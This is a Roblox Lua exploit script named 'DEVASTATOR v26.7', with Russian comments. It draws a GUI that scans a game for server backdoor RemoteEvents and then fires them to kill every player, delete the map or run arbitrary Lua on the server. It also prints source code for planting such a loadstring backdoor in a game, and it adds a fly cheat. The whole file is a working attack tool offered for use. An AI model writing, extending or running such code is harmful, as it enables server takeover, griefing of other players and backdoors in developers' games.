--[[
    DEVASTATOR v26.7 // AUTOMATIC BREACH SYSTEM
    FIXED: Full Code, Auto-Scan, Fly, Chaos Panel.
    HOTKEYS: 'L' - Menu | 'E' - Fly | 'Q' - Fly Speed
]]

local p = game:GetService("Players")
local lp = p.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local uis = game:GetService("UserInputService")
local cg = game:GetService("CoreGui")
local lit = game:GetService("Lighting")

-- [1] UI СИСТЕМА
if cg:FindFirstChild("DevOverlord") then cg.DevOverlord:Destroy() end
local sg = Instance.new("ScreenGui", cg) sg.Name = "DevOverlord"

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 550, 0, 480)
main.Position = UDim2.new(0.5, -275, 0.5, -240)
main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true -- Перетаскивание за любое место
Instance.new("UICorner", main)
local stroke = Instance.new("UIStroke", main) stroke.Color = Color3.new(1,0,0) stroke.Thickness = 2

-- ЗАГОЛОВОК
local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = " DEVASTATOR v26.7 // BREACH STATUS: SEARCHING..."
title.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.Code
Instance.new("UICorner", title)

-- ТЕРМИНАЛ
local logs = Instance.new("ScrollingFrame", main)
logs.Size = UDim2.new(1, -20, 0, 120)
logs.Position = UDim2.new(0, 10, 1, -130)
logs.BackgroundColor3 = Color3.new(0, 0, 0)
logs.BorderSizePixel = 0
local lay = Instance.new("UIListLayout", logs)

local function log(txt, col)
    local l = Instance.new("TextLabel", logs)
    l.Size = UDim2.new(1, 0, 0, 20)
    l.Text = " [>] " .. tostring(txt)
    l.TextColor3 = col or Color3.new(1, 0, 0)
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.Code
    l.TextXAlignment = Enum.TextXAlignment.Left
    logs.CanvasSize = UDim2.new(0, 0, 0, lay.AbsoluteContentSize.Y)
    logs.CanvasPosition = Vector2.new(0, 9999)
end

-- [2] ЯДРО (AUTO-BREACH & SS)
local ss_event = nil

local function ss_send(id, val)
    if ss_event then
        ss_event:FireServer(id, val)
        log("SS EXEC SUCCESS", Color3.new(0,1,0))
    else
        log("NO SS CONNECTION", Color3.new(1,0.5,0))
        -- Локальный эффект (если SS нет)
        if id == 882 then
            local sk = lit:FindFirstChildOfClass("Sky") or Instance.new("Sky", lit)
            sk.SkyboxBk = val sk.SkyboxDn = val sk.SkyboxFt = val
        end
    end
end

local function scanAndBreach()
    log("INITIALIZING AUTO-BREACH...", Color3.new(1, 1, 0))
    local found = rs:GetDescendants()
    for _, v in pairs(found) do
        if v:IsA("RemoteEvent") then
            -- Проверяем на стандартные бэкдоры
            if v.Name == "NetworkStream" or v.Name == "InternalStatus" or v.Name:find("Handshake") then
                ss_event = v
                title.Text = " STATUS: SS CONNECTED (" .. v.Name .. ")"
                log("BACKDOOR DETECTED: " .. v.Name, Color3.new(0, 1, 0))
                return
            end
        end
    end
    log("NO DIRECT BACKDOOR. SEARCHING VULNERABILITIES...", Color3.new(1, 0.5, 0))
end

-- [3] ГЛАВНЫЙ ИНТЕРФЕЙС (КНОПКИ)
local inp = Instance.new("TextBox", main)
inp.Size = UDim2.new(0, 350, 0, 30)
inp.Position = UDim2.new(0.5, -175, 0, 50)
inp.PlaceholderText = "ASSET ID / LUA CODE"
inp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
inp.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", inp)

local g = Instance.new("Frame", main)
g.Size = UDim2.new(1, -20, 0, 200)
g.Position = UDim2.new(0, 10, 0, 90)
g.BackgroundTransparency = 1
local grid = Instance.new("UIGridLayout", g)
grid.CellSize = UDim2.new(0, 170, 0, 35)

local function btn(txt, cb, col)
    local b = Instance.new("TextButton", g)
    b.Text = txt
    b.BackgroundColor3 = col or Color3.fromRGB(50, 0, 0)
    b.TextColor3 = Color3.new(1, 1, 1)
    b.Font = Enum.Font.Code
    b.MouseButton1Click:Connect(cb)
    Instance.new("UICorner", b)
end

-- ФУНКЦИИ
btn("AUTO BREACH", scanAndBreach, Color3.fromRGB(150, 0, 150))
btn("GIVE HAMMER", function() Instance.new("HopperBin", lp.Backpack).BinType = 4 log("Hammer Given") end)
btn("GLOBAL SKY", function() ss_send(882, "rbxassetid://"..inp.Text) end)
btn("GLOBAL AUDIO", function() ss_send(993, "rbxassetid://"..inp.Text) end)
btn("KILL ALL", function() ss_send(771, "for _,p in pairs(game.Players:GetPlayers()) do p.Character:BreakJoints() end") end, Color3.fromRGB(120, 0, 0))
btn("NUKE MAP", function() ss_send(771, "for _,v in pairs(workspace:GetChildren()) do if v:IsA('BasePart') then v:Destroy() end end") end, Color3.fromRGB(120, 0, 0))
btn("REMOTE EXEC", function() ss_send(771, inp.Text) end, Color3.fromRGB(0, 120, 0))
btn("GEN BACKDOOR", function()
    local code = "local r=Instance.new('RemoteEvent',game:GetService('ReplicatedStorage')) r.Name='NetworkStream' r.OnServerEvent:Connect(function(_,i,v) if i==771 then loadstring(v)() end end)"
    print(code) log("CODE IN F9 CONSOLE")
end, Color3.fromRGB(100, 100, 0))

-- [4] ПОЛЕТ И ХОТКЕИ
local flying = false
local flySpeed = 50
uis.InputBegan:Connect(function(k, m)
    if m then return end
    if k.KeyCode == Enum.KeyCode.E then
        flying = not flying
        local char = lp.Character or lp.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")
        if flying then
            log("FLY: ON", Color3.new(0,1,0))
            task.spawn(function()
                local bv = Instance.new("BodyVelocity", hrp)
                bv.MaxForce = Vector3.new(1e8, 1e8, 1e8)
                while flying do
                    local cam = workspace.CurrentCamera
                    local move = Vector3.new(0,0,0)
                    if uis:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
                    if uis:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
                    if uis:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
                    if uis:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
                    bv.Velocity = move * flySpeed
                    task.wait()
                end
                bv:Destroy()
            end)
        else
            log("FLY: OFF", Color3.new(1,0,0))
        end
    elseif k.KeyCode == Enum.KeyCode.L then main.Visible = not main.Visible
    elseif k.KeyCode == Enum.KeyCode.Q then flySpeed = flySpeed + 25 log("SPEED: "..flySpeed)
    end
end)

log("DEVASTATOR v26.7 LOADED.")
log("USE 'AUTO BREACH' TO START.")
